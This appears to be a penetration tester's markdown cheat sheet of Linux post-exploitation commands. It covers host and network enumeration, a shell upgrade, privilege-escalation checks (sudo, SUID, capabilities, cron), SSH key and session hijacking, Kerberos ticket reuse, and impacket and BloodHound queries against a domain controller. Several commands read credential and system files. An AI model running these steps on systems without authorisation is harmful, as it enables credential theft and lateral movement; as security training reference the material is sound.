# Linux

## Execution

## Post-Exploitation

### Basic Information
```bash
whoami
id
cat /etc/passwd
cat /etc/group
ls -la /home
ls -la /opt
printenv
ps -aux
cat ~/.bash_history
```

### Network
```bash
ifconfig
ip address
route print
ss -anpl
for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done
```

### Misc
* upgrade shell
```bash
python3 -c "import pty;pty.spawn('/bin/bash')"
```

## Privilege Escalation

### sudo
```bash
sudo -l
```

### SUID/SGID
```bash
find / -perm -u+s 2>/dev/null
find / -perm -g+s 2>/dev/null
```

### Capabilities
```bash
/usr/sbin/getcap -r / 2>/dev/null
```

### Cron
```
ls -la /etc/cron*
crontab -l
```

### File permissions
```bash
ls -la /etc/passwd
ls -la /etc/group
ls -la /etc/shadow
```

### linpeas
```bash
./linpeas.sh
```

### pspy
```bash
./pspy64
```


## Lateral Movement

### SSH
* private keys
```
ls -la ~/.ssh
ls -la /etc/ssh
```

* Session Hijack with ControlMaster
```bash
ssh -S <session file> <user>@192.168.1.1
```

### Kerberos
search ccache of ssh session
```
ps -aux | grep ssh
pstree | grep ssh
cat /proc/<pid>/environ
```

list loaded ccache
```
klist
```

load ccache
```
export KRB5CCNAME=$(pwd)/krb5cc_0
```

edit /etc/hosts to interact with DC
```
vim /etc/hosts
```

list AD user
```
impacket-GetADUsers -all -k -no-pass -dc-ip 172.16.1.1 <domain>/<user>
```

BloodHound
```
bloodhound-python -c all -k -no-pass --auth-method kerberos -d <domain> -u <user>@<domain> -dc <dc> -ns <name server(dc)> --dns-tcp --zip -v  
```

convert kirbi to ccache
```
impacket-ticketConverter 'ticket.kirbi' ticket.ccache
```